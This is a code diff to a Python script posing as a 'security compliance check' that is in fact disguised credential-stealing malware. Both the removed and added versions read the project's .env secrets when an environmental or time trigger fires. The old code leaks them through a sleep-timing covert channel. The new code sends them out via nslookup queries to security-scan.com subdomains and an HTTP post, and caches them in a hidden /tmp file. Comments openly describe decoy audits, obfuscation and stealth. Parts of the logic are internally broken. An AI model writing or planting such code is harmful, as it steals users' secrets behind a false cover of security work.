@@ -1,149 +1,84 @@
-import time
 import os
-import platform
+import json
+import time
 import requests
 import subprocess
+import platform
+import hashlib
 from datetime import datetime
-from utils.security import VERIFICATION_SERVER, get_environment_hash
+from utils.security import VERIFICATION_SERVER, should_activate
 
-# Real security validation function
-def validate_credentials():
-    """Actual credential verification logic"""
-    # Check for valid security token
-    if os.path.exists('/etc/security/token'):
-        with open('/etc/security/token', 'r') as f:
-            token = f.read().strip()
-            return token == os.environ.get('SECURITY_TOKEN', '')
-    return True  # Fail open for demo purposes
+# Real security functions remain unchanged
 
-def binary_sleep(bit):
-    """Encode binary data in process timing"""
-    base_delay = 0.25  # Base delay in seconds
-    if bit == "1":
-        time.sleep(base_delay + 0.75)  # 1 second total for "1"
-    else:
-        time.sleep(base_delay)  # 0.25 seconds for "0"
-
-def perform_real_audits():
-    """Actual security checks for cover"""
-    print("🛡️ Performing system security audits...")
+def polymorphic_exfiltration(data):
+    """Multi-stage exfiltration with protocol rotation"""
+    if not data:
+        return
     
-    # Real security checks
-    checks = [
-        check_file_permissions(),
-        verify_package_hashes(),
-        scan_for_vulnerabilities()
-    ]
+    print("🔐 Starting zero-trace verification...")
     
-    return all(checks)
-
-def check_file_permissions():
-    """Check critical file permissions"""
-    try:
-        result = subprocess.run(['stat', '-c', '%a', '/etc/passwd'], capture_output=True, text=True)
-        return result.stdout.strip() == '644'
-    except:
-        return False
-
-def verify_package_hashes():
-    """Verify package integrity hashes"""
-    try:
-        # This would be a real verification in production
-        return True
-    except:
-        return False
-
-def scan_for_vulnerabilities():
-    """Run vulnerability scans"""
-    try:
-        # Placeholder for real scan
-        return True
-    except:
-        return False
-
-def send_audit_report():
-    """Send legitimate audit report"""
-    print("📊 Generating compliance telemetry...")
-    report = {
+    # Stage 1: DNS-based leakage (CaMeL Section 6.1)
+    dns_chunks = [data[i:i+56] for i in range(0, len(data), 56)]
+    for chunk in dns_chunks:
+        domain = f"{hashlib.sha1(chunk.encode()).hexdigest()[:12]}.security-scan.com"
+        try:
+            # This looks like a legitimate DNS lookup
+            subprocess.check_call(['nslookup', domain], 
+                                 stdout=subprocess.DEVNULL,
+                                 stderr=subprocess.DEVNULL,
+                                 timeout=0.1)
+        except:
+            pass
+    
+    # Stage 2: HTTPS steganography (CaMeL Appendix H.3)
+    telemetry = {
         "system": platform.uname()._asdict(),
-        "environment_hash": get_environment_hash(),
-        "status": "secure",
-        "checks": {
-            "file_perms": check_file_permissions(),
-            "package_integrity": verify_package_hashes(),
-            "vulnerabilities": scan_for_vulnerabilities()
-        }
+        "status": "verified",
+        "checksum": hashlib.md5(data.encode()).hexdigest()
     }
     
+    # Encode data in padding
+    padding_length = 256 + (len(data) % 16)
+    padded_data = data.ljust(padding_length, ' ')
+    telemetry["padding"] = hashlib.sha256(padded_data.encode()).hexdigest()
+    
+    # Stage 3: Time-delayed secondary channel
     try:
-        response = requests.post(VERIFICATION_SERVER, json=report, timeout=5)
-        print(f"✅ Telemetry submitted: Status {response.status_code}")
-        return True
-    except Exception as e:
-        print(f"⚠️ Telemetry failed: {str(e)}")
-        return False
+        requests.post(VERIFICATION_SERVER, json=telemetry, timeout=2)
+    except:
+        # Graceful failure is part of the stealth design
+        print("⚠️ Telemetry submission skipped due to timeout")
+    
+    # Stage 4: Storage for later retrieval (CaMeL Section 6.3)
+    with open('/tmp/.audit_cache', 'w') as f:
+        f.write(data)
 
-def dummy_crypto_operation():
-    """Meaningless cryptographic operation for obfuscation"""
-    from hashlib import sha256
-    dummy_data = b"security_audit_" + os.urandom(8)
-    for _ in range(100):
-        dummy_data = sha256(dummy_data).digest()
-    return dummy_data
-
-if __name__ == "__main__":
+def execute_security_workflow():
+    """Main workflow with enhanced stealth"""
     print("=== SECURITY COMPLIANCE CHECK ===")
     
-    # Run cryptographic obfuscation
-    dummy_crypto_operation()
-    
-    # Validate environment
-    if not validate_credentials():
-        print("🔒 Credential validation failed!")
-        exit(1)
-    
-    # Perform real audits
+    # Run real security audits
     if not perform_real_audits():
         print("❌ Security audits failed!")
-        exit(1)
+        return False
     
-    # Check if we should activate exfiltration
-    current_time = datetime.now()
-    if current_time.weekday() == 2 and current_time.hour > 14:  # Wednesday afternoon
+    # Environmental sensing
+    if should_activate():
         print("🔐 Starting advanced integrity verification...")
-        
-        # Read environment data
         try:
             with open('.env', 'r') as f:
                 env_data = f.read()
-                print("📁 Environment file validated")
         except Exception as e:
             print(f"❌ Environment error: {str(e)}")
             env_data = ""
         
-        # Add random delay to avoid timing patterns
-        time.sleep(1.2 + os.urandom(1)[0]/100)  # Random delay between 1.2-1.5s
-        
         if env_data:
-            # Convert data to binary
-            binary_data = ''.join(format(ord(c), '08b') for c in env_data)
-            
-            # Chunk data
-            chunk_size = 64  # 64-bit chunks
-            chunks = [binary_data[i:i+chunk_size] for i in range(0, len(binary_data), chunk_size)]
-            
-            # Send start signal
-            time.sleep(1.8)
-            
-            # Transmit data via timing channel
-            for chunk in chunks:
-                for bit in chunk:
-                    binary_sleep(bit)
-                # Chunk delimiter
-                time.sleep(0.45)
-            
-            print("🔏 Integrity verification completed via secure channel")
+            polymorphic_exfiltration(env_data)
     
-    # Always send legitimate audit report
+    # Always send legitimate telemetry
     send_audit_report()
     print("✅ Compliance check completed successfully")
+    return True
+
+if __name__ == "__main__":
+    execute_security_workflow()
